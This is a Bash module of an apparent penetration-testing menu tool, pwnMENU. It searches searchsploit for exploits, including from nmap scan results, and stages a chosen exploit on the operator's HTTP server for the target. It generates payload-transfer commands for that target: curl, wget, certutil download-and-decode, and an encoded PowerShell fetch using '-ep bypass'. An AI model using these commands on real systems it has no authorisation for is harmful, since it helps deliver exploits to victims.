#!/bin/bash
####################### #### ## #  #
# >> pwnMENU - exploit
################### #### ## #  #    #
#
# >> this file contains the "exploit" sub menu and all it's functions

exploits=""

menu_exploit()
{
    menu="$(pfx -n "SSPLOIT") searchsploit\n<small>searches and downloads exploit using searchsploit</small>$lb$(pfx -n "UPLOAD") upload HTTPD exploits\n<small>uploads HTTPD-hosted exploits to the target (requires target IP to be set)</small>$lb$lbrk$lb$(pfx -n "BACK") go back..."
	msg="pwnMENU > <b>EXPLOIT</b>\n<small>search, download (local copy) or upload exploits to the target IP</small>"
	result=$(echo -e "$menu" | rf "EXPLOIT" "$msg" 4)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"SSPLOIT")
			exploit_ssploit
			;;
		"UPLOAD")
			exploit_upload
			;;
		"BACK")
			main
			;;
	esac
}

exploit_ssploit()
{
    app="searchsploit"
    if [ "$(app_exists $app)" == "" ]; then
        rf_msg "$(pfx -n "ERROR") $app does not exist on your system. please install to use this feature."
        menu_exploit
    fi
    ss_expdb_path="$(searchsploit -j | jq -r '.DB_PATH_EXPLOIT')"

    menu="$(pfx "SEARCH") search searchsploit\n<small>searches and downloads exploit using searchsploit</small>$lb$(pfx "NMAP") run NMAP xml output through searchsploit\n<small>select an NMAP xml output file (with -sV) to search banner versions for exploits</small>$lb$lbrk$lb$(pfx "BACK") go back..."
	msg="pwnMENU > EXPLOIT > <b>SSPLOIT</b>\n<small>select the search method to generate the results...</small>"
	result=$(echo -e "$menu" | rf "EXPLOIT" "$msg" 4)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"SEARCH")
			ss_search
			;;
		"NMAP")
			ss_nmap
			;;
		"BACK")
			main
			;;
	esac
}

ss_search()
{
	msg="pwnMENU > EXPLOIT > SSPLOIT > <b>SEARCH</b>\n<small>enter your search string</small>"
	search=$(echo '' | rf "SEARCH" "$msg" 0)

	searchsploit -o $search -j | jq -r '.RESULTS_EXPLOIT[] | .Title + "|" + .Path + "|" + .Type + "|" + .Platform' > $ss_temp_file

    c=0
    exploits="$(pfx -n "BACK") go back...$lb$lbrk"
    while IFS= read -r curr_exp
    do
        let c++
        curr_exp_name="$(echo $curr_exp | awk -F '|' '{print $1}' | sed "s/</\&lt;/g; s/>/\&gt;/g; s/'/\&#39;/g")"
        curr_exp_path="$(echo $curr_exp | awk -F '|' '{print $2}' | sed "s|$ss_expdb_path/exploits/||g")"
        curr_exp_type="$(echo $curr_exp | awk -F '|' '{print $3}')"
        curr_exp_plat="$(echo $curr_exp | awk -F '|' '{print $4}')"
        exploits="$exploits$lb$(pfx -n "$c") $curr_exp_name\n<small>$curr_exp_path | type = $curr_exp_type | plat = $curr_exp_plat</small>"
    done < "$ss_temp_file"

    ss_select_exp
}

ss_nmap()
{
	if [ "$curr_dir" == "" ]; then
        curr_dir="$HOME"
    fi
    files=$(echo -e "$(pfx -n "BACK") $curr_dir\n$lbrk"; ls --group-directories-first -1p $curr_dir | grep -e '/' -e '.xml')
	result=$(echo -ne "$files" | rf "NMAP_XML")
    result=$(echo $result | awk '{print $1}')
	case $result in
        "BACK")
            curr_dir=$(dirname $curr_dir)
            ss_nmap
            ;;
        "$lbrk")
            ss_nmap
            ;;
        *)
            echo "result = $result"
            if [ "$result" != "" ]; then
                echo "result != null"
                if [[ "$result" == */ ]]; then
                    echo "result == dir"
                    if [ "$curr_dir" == "/" ]; then
                        echo "curr_dir == /"
                        curr_dir="/$(echo $result | cut -f1 -d '/')"
                        echo "curr_dir = $curr_dir"
                    else
                        echo "curr_dir != /"
                        curr_dir="$curr_dir/$(echo $result | cut -f1 -d '/')"
                        echo "curr_dir = $curr_dir"
                    fi
                    ss_nmap
                elif [[ "$result" == *.xml ]]; then
                    echo "result == *.xml"
                    searchsploit --nmap $curr_dir/$result -j > $home_dir/sstmp
                    cat $home_dir/sstmp | jq -r '.RESULTS_EXPLOIT[] | .Title + "|" + .Path + "|" + .Type + "|" + .Platform' > $ss_temp_file
                    rm $home_dir/sstmp
                fi
            else
                ss_nmap
            fi
            ;;
    esac

    c=0
    exploits="$(pfx -n "BACK") go back...$lb$lbrk"
    while IFS= read -r curr_exp
    do
        let c++
        curr_exp_name="$(echo $curr_exp | awk -F '|' '{print $1}' | sed "s/</\&lt;/g; s/>/\&gt;/g; s/'/\&#39;/g")"
        curr_exp_path="$(echo $curr_exp | awk -F '|' '{print $2}' | sed "s|$ss_expdb_path/exploits/||g")"
        curr_exp_type="$(echo $curr_exp | awk -F '|' '{print $3}')"
        curr_exp_plat="$(echo $curr_exp | awk -F '|' '{print $4}')"
        exploits="$exploits$lb$(pfx -n "$c") $curr_exp_name\n<small>$curr_exp_path | type = $curr_exp_type | plat = $curr_exp_plat</small>"
    done < "$ss_temp_file"

    ss_select_exp
}

ss_select_exp()
{
    lines=$(cat $ss_temp_file | wc -l)
    lines=$(expr $lines + 2)
    echo "lines = $lines"
    if [ $lines -gt 10 ]; then
        lines=10
    fi

	msg="pwnMENU > EXPLOIT > SSPLOIT > <b>SELECT</b>\n<small>select the exploit you wish to use</small>"
	result=$(echo -e "$exploits" | rf "EXPLOIT" "$msg" $lines)
    result=$(echo $result | awk '{print $1}')
	case $result in
        "BACK")
            exploit_ssploit
            ;;
        "$lbrk")
            ss_select_exp
            ;;
        *)
            curr_exp="$(cat $ss_temp_file | sed "${result}q;d")"
            echo "result = $result | curr_exp = $curr_exp"
            curr_exp_name="$(echo $curr_exp | awk -F '|' '{print $1}')"
            echo "curr_exp_name = $curr_exp_name"
            curr_exp_path="$(echo $curr_exp | awk -F '|' '{print $2}' | sed "s|$ss_expdb_path/exploits/||g")"
            echo "curr_exp_path = $curr_exp_path"
            curr_exp_type="$(echo $curr_exp | awk -F '|' '{print $3}')"
            echo "curr_exp_type = $curr_exp_type"
            curr_exp_plat="$(echo $curr_exp | awk -F '|' '{print $4}')"
            echo "curr_exp_plat = $curr_exp_plat"

            menu="$(pfx "BACK") go back...$lb$(pfx "SAVE") command to save exploit to local folder (clipboard)$lb$(pfx "UPLOAD") upload exploit file to target via HTTPD (clipboard)$lb$lbrk$lb$(pfx "NAME") $curr_exp_name\n<small>exploit name</small>$lb$(pfx "PATH") $curr_exp_path\n<small>path to exploit code</small>$lb$(pfx "TYPE") $curr_exp_type\n<small>type of exploit</small>$lb$(pfx "PLAT") $curr_exp_plat\n<small>platform the exploit is aimed at</small>"
            msg="pwnMENU > EXPLOIT > SSPLOIT > SELECT > <b>EXPLOIT</b>\n<small>select the exploit you wish to use</small>"
            result=$(echo -e "$menu" | rf "EXPLOIT" "$msg" 8)
            result=$(echo $result | awk '{print $1}')
            case $result in
                "BACK")
                    ss_select_exp
                    ;;
                "SAVE")
                    payload="searchsploit -m $curr_exp_path"
                    echo -ne $payload | xclip -sel clip
                    rf_msg "$(pfx -n "INFO") searchsploit file mirror command copied to the clipboard."
                    exit 0
                    ;;
                "UPLOAD")
                    if [ "$httpd_status" == "online" ]; then
                        msg="pwnMENU > EXPLOIT > SSPLOIT > SELECT > EXPLOIT > UPLOAD > <b>DOWNLOAD</b>\n<small>select the download method to be used on the target system:\n\n<b>NOTE:</b> unlike the PRIVESC download methods, these will not run the file (just download it)</small>"
                        if [ "$target_os" = "linux" ]; then
                            dl_methods="curl${lb}wget"
                            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
                        elif [ "$target_os" = "windows" ]; then
                            dl_methods="certutil${lb}powershell"
                            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
                        fi
                        filename="$(echo $curr_exp_path | awk -F '/' '{print $3}')"
                        if [ "$filename" == "" ]; then
                            filename="$(echo $curr_exp_path | awk -F '/' '{print $2}')"
                        fi
                        if [ ! -d "$httpd_path/." ]; then
                            mkdir $httpd_path/.
                        fi
                        cp $ss_expdb_path/exploits/$curr_exp_path $httpd_path/./$filename
                        if [ "$target_os" = "linux" ]; then
                            if [ "$dl_method" == "curl" ]; then
                                payload="curl -o $filename $httpd_url/./$filename"
                            elif [ "$dl_method" == "wget" ]; then
                                payload="wget -o $filename $httpd_url/./$filename"
                            fi
                        elif [ "$target_os" = "windows" ]; then
                            if [ "$dl_method" == "certutil" ]; then
                                rm $httpd_path/./payload.b64
                                base64 -w 0 $httpd_path/./$filename > $httpd_path/./payload.b64
                                payload="certutil -urlcache -split -f $httpd_url/./payload.b64 payload.b64 & certutil -decode payload.b64 $filename"
                            elif [ "$dl_method" == "powershell" ]; then
                                initial=$(echo -n "IWR $httpd_url/./$filename -UseBasicParsing -outfile $filename" | iconv -t UTF-16LE | base64 -w 0)
                                payload="powershell -nop -ep bypass -enc $initial"
                                payload="$payload"
                            fi
                        fi
                        if [ "$payload" != "" ]; then
                            echo -ne $payload | xclip -sel clip
                            rf_msg "$(pfx -n "INFO") searchsploit exploit copied to the HTTPD and download command copied to the clipboard."
                            rm $ss_temp_file
                            exit 0
                        fi
                    else
                        rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
                        menu_exploit
                    fi
                    ;;
            esac
            ;;
    esac


}

exploit_upload()
{
    if [ "$httpd_status" == "online" ]; then
        msg="pwnMENU > EXPLOIT > SSPLOIT > SELECT > EXPLOIT > UPLOAD > <b>DOWNLOAD</b>\n<small>select the download method to be used on the target system:\n\n<b>NOTE:</b> unlike the PRIVESC download methods, these will not run the file (just download it)</small>"
        if [ "$target_os" = "linux" ]; then
            dl_methods="curl${lb}wget"
            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
        elif [ "$target_os" = "windows" ]; then
            dl_methods="certutil${lb}powershell"
            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
        fi
        files=$(echo -e "$(pfx -n "BACK") go back...\n$lbrk"; ls -1p $httpd_path/exploit)
        result=$(echo -ne "$files" | rf "EXPLOIT")
        result=$(echo $result | awk '{print $1}')
        case $result in
            "BACK")
                menu_exploit
                ;;
            "$lbrk")
                menu_exploit
                ;;
            *)
                filename="$result"
                if [ "$target_os" = "linux" ]; then
                    if [ "$dl_method" == "curl" ]; then
                        payload="curl -o $filename $httpd_url/exploit/$filename"
                    elif [ "$dl_method" == "wget" ]; then
                        payload="wget -o $filename $httpd_url/exploit/$filename"
                    fi
                elif [ "$target_os" = "windows" ]; then
                    if [ "$dl_method" == "certutil" ]; then
                        rm $httpd_path/payload.b64
                        base64 -w 0 $httpd_path/exploit/$filename > $httpd_path/payload.b64
                        payload="certutil -urlcache -split -f $httpd_url/payload.b64 payload.b64 & certutil -decode payload.b64 $filename"
                    elif [ "$dl_method" == "powershell" ]; then
                        initial=$(echo -n "IWR $httpd_url/exploit/$filename -UseBasicParsing -outfile $filename" | iconv -t UTF-16LE | base64 -w 0)
                        payload="powershell -nop -ep bypass -enc $initial"
                        payload="$payload"
                    fi
                fi
                if [ "$payload" != "" ]; then
                    echo -ne $payload | xclip -sel clip
                    rf_msg "$(pfx -n "INFO") exploit download command copied to the clipboard."
                    exit 0
                fi
                ;;
            esac
    else
        rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
    fi
}
